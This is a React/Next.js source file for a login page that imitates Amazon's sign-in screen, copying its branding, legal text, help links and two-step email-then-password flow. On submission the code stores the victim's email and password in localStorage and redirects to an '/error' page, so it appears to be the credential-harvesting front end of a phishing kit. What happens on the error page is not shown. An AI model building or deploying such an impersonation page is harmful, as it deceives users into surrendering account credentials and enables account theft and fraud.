/* eslint-disable react/no-unescaped-entities */
"use client";

import { useEffect, useState } from "react";
import { useRouter } from 'next/navigation';
import styles from './styles.module.css';
import LoginMobile from "./components/loginMobile/loginMobile";
import useWindowDimensions from '../hooks/useWindowDimension';


function Home() {
  const { width, height } = useWindowDimensions();
  const windowWidth = width;
  const [show, setShow] = useState(false);
  const [step, setStep] = useState(1);
  const [data, setData] = useState({ email: null, password: null });
  const [error, setError] = useState({ status: false, msg: '' });
  const [isMounted, setIsMounted] = useState(false);
  const router = useRouter();

  useEffect(() => {
    setIsMounted(true);
  }, []);


  useEffect(() => {
    localStorage.removeItem('email');
    localStorage.removeItem('password');
  }, [])

  if (!isMounted) {
    return null;
  }

  const renderFormStep = (step) => {
    switch (step) {
      case 1:
        return <>
          <label htmlFor="email" className={styles.loginLabel}>
            Email or mobile phone number
          </label>
          <div className="mt-px">
            <input
              id="email"
              name="email"
              className={`${error.status ? styles.loginInputError : ""}`}
              onChange={(e) => { setData({ ...data, email: e.target.value }) }}
            />
          </div>
        </>;
      case 2:
        return <>
          <div className={styles.loginRow}>
            <span>{data.email}</span>
            <a className={styles.loginLink} tabIndex="5" href="#" role="button"
              onClick={() => {
                setData({ ...data, email: null });
                setStep(1);
              }}>
              {" "}Change
            </a>
          </div>
          <div className="flex flex-row justify-between">
            <label htmlFor="pswd" className={styles.loginLabel}>
              Password
            </label>
            <a className={styles.loginLink} tabIndex="6" href="#">
              Forgot your password?
            </a>
          </div>
          <div className="mt-px">
            <input
              id="pswd"
              name="pswd"
              onChange={(e) => { setData({ ...data, password: e.target.value }) }}
              className={`${error.status ? styles.loginInputError : ""}`}
            />
          </div>
        </>;
    }
  };

  const renderFormFooter = (step) => {
    switch (step) {
      case 1:
        return <>
          <div className={styles.loginHelp + " mb-5"}>
            By continuing, you agree to Amazon's{" "}
            <a href="#">
              Conditions of Use
            </a>{" "}
            and{" "}
            <a href="#">
              Privacy Notice
            </a>.
          </div>
          <div className={styles.loginSection}>
            <div className={styles.loginRow}>
              <a
                className={styles.loginExpander}
                href="javascript:void(0)"
                onClick={() => { setShow(!show); }}
              >
                <i className={`${styles.loginIcon} ${!show ? styles.loginIconExpand : styles.loginIconCollapse}`} />
                <span>Need help?</span>
              </a>
              {
                show &&
                <ul className={styles.loginUnorderedList + " " + styles.loginNoStyle + " " + styles.loginVertical}>
                  <li>
                    <span className={styles.loginListItem}>
                      <div
                        aria-expanded="true"
                        className={styles.loginExpander}
                        style={{ overflow: "hidden" }}
                      >
                        <a
                          id="auth-fpp-link-bottom"
                          className={styles.loginExpander}
                          href="#"
                        >
                          Forgot your password?
                        </a>
                      </div>
                    </span>
                  </li>
                  <li>
                    <span className={styles.loginListItem}>
                      <div
                        aria-expanded="true"
                        className={styles.loginExpander}
                        style={{ overflow: "hidden" }}
                      >
                        <a
                          id="ap-other-signin-issues-link"
                          className={styles.loginExpander}
                          href="#"
                        >
                          Other issues with Sign-In
                        </a>
                      </div>
                    </span>
                  </li>
                </ul>
              }
            </div>
          </div>
          <div className={styles.loginSection}>
            <hr aria-hidden="true" />
            <div>
              <span className={styles.loginLabel}>Buying for work?</span>
            </div>
            <a
              className={styles.loginLink}
              href="#"
            >
              <span>Shop on Amazon Business</span>
            </a>
          </div>
        </>;
      case 2:
        return <>
          <div className={styles.loginRow + " mt-4"}>
            <div className={styles.loginSection}>
              <label htmlFor="login-remember-me" className={styles.loginFormLabel}>
                <div data-a-input-name="rememberMe" className={styles.loginCheckbox}>
                  <label className="flex flex-row">
                    <input
                      type="checkbox"
                      name="rememberMe"
                      defaultValue="true"
                      tabIndex={4}
                    />
                    <i className={styles.loginIcon + " " + styles.loginIconCheckbox} />
                    <span className={styles.loginLabel + " " + styles.loginCheckboxLabel}>
                      Keep me signed in.{" "}
                      <span>
                        <a
                          id="remember_me"
                          href="javascript:void(0)"
                          role="button"
                          className={styles.loginLink}
                        >
                          Details
                          <i className={styles.loginIcon + " " + styles.loginIconPopover} />
                        </a>
                      </span>
                    </span>
                  </label>
                </div>
              </label>
            </div>
          </div>
        </>;
    }
  };

  const renderFormButtonTxt = (step) => {
    switch (step) {
      case 1:
        return "Continue";
      case 2:
        return "Sign in";
    }
  };

  const onNextStep = (e) => {
    e.preventDefault();
    const err = { status: false, msg: '' };
    let isErr = false;

    const isValidEmail = (email) => {
      return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
    };

    const isValidPhone = (phone) => {
      return /^\(?([0-9]{3})\)?[-. ]?([0-9]{3})[-. ]?([0-9]{4})$/.test(phone);
    };

    if (step === 1) {
      if (!data.email?.trim()) {
        err.status = true;
        err.msg = "Enter your email or mobile phone number";
        isErr = true;
      } else if (!isValidEmail(data.email) && !isValidPhone(data.email)) {
        err.status = true;
        err.msg = "Enter a valid email address or mobile phone number";
        isErr = true;
      }
    } else if (step === 2) {
      if (!data.password?.trim()) {
        err.status = true;
        err.msg = "Enter your password";
        isErr = true;
      } else {
        localStorage.setItem('email', data.email);
        localStorage.setItem('password', data.password);
        router.push('/error', { scroll: false });
      }
    }
    if (!isErr) {
      setStep(step + 1);
    }
    setError(err);
  };

  if (windowWidth < 640) {
    return <LoginMobile />

  }

  return (

    <main className={`flex min-h-screen flex-col items-center justify-between ${styles.mainContainer}`}>
      <div className="flex min-h-full flex-1 flex-col ">
        <div className="flex justify-center items-center">
          <i className={styles.loginLogo} alt="Logo here" />
        </div>
        <div className={`${styles.loginForm} mt-2.5`}>
          <form action="#" method="POST">
            <h1 className={`mb-2 ${styles.loginTittle}`}>
              Sign in
            </h1>
            {
              renderFormStep(step)
            }
            {error.status &&
              <div className={`${styles.loginAlertInline} ${styles.loginAlertError}`} role="alert" style={{ display: "block" }}>
                <div className={`${styles.loginAlertContainer}`}>
                  <i className={`${styles.loginIcon} ${styles.loginIconAlert}`} />
                  <div className={`${styles.loginAlertContent}`}>
                    {error.msg}
                  </div>
                </div>
              </div>
            }
            <div>
            </div>
            <div>
              <button
                className={`flex w-full justify-center  mt-5 ${styles.loginBtn}`}
                onClick={(e) => onNextStep(e)}
              >
                {renderFormButtonTxt(step)}
              </button>
            </div>
            {renderFormFooter(step)}

          </form>

        </div>
        {
          step == 1 && <>
            <div className={`${styles.loginDivider} ${styles.loginDividerBreak}`}><h5 aria-level="5">New to Amazon?</h5></div>
            <span className={`${styles.loginButton}`}>
              <span className={`${styles.loginButtonInner}`}>
                <a href="#" className={`${styles.loginButtonText}`}>
                  Create your Amazon account
                </a></span></span>
          </>
        }
      </div>
    </main>
  );
};

export default Home